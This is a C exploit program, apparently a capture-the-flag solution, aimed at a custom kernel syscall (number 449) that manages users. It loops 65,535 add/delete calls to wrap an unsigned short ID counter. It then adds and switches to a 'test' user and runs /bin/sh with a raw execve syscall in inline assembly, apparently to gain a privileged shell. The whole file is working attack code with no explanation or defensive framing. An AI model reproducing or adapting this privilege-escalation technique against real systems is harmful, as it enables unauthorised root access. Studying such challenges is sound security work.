//gcc -o exploit exploit_asm.c -nostdlib -nostartfiles -Os -s -static --entry main

static unsigned short nextId = 0;

typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

int main() {
    //const char* message = "Hello, world!\n";
    //syscall(SYS_write, STDOUT_FILENO, message, 14);
    char *user = "test";
    char *pass = "test";
    unsigned long ret;
    char *cmd = "/bin/sh";

    nextId = 1;
    for( int i = 0; i < 65536; i++ )
    {
	if( nextId == 65535 )
	{
	    //syscall(449, MAGIC_ADD, "test", "test");
	    //syscall(449, MAGIC_SWITCH, "test", "test");
	    //system("/bin/sh");
		asm volatile (
				"syscall"
				: "=a" (ret)
				: "a" (449), "D" (MAGIC_ADD), "S" (user), "d" (pass)
				: "rcx", "r11", "memory"
			     );

		asm volatile (
				"syscall"
				: "=a" (ret)
				: "a" (449), "D" (MAGIC_SWITCH), "S" (user), "d" (pass)
				: "rcx", "r11", "memory"
			     );


		asm volatile (
				"mov $0x3b, %%rax\n"   // syscall number for execve
				"mov %0, %%rdi\n"      // command string
				"xor %%rsi, %%rsi\n"   // argv = NULL
				"xor %%rdx, %%rdx\n"   // envp = NULL
				"syscall\n"            // invoke the syscall
				:
				: "g"(cmd)
				: "rax", "rdi", "rsi", "rdx"
			     );

	}
	else
	{
	    //syscall(449, MAGIC_ADD, "test", "test");
	    //syscall(449, MAGIC_DELETE, "test", "test");
		asm volatile (
				"syscall"
				: "=a" (ret)
				: "a" (449), "D" (MAGIC_ADD), "S" (user), "d" (pass)
				: "rcx", "r11", "memory"
			     );

		asm volatile (
				"syscall"
				: "=a" (ret)
				: "a" (449), "D" (MAGIC_DELETE), "S" (user), "d" (pass)
				: "rcx", "r11", "memory"
			     );

	}
	nextId++;
    }

    return 0;
}
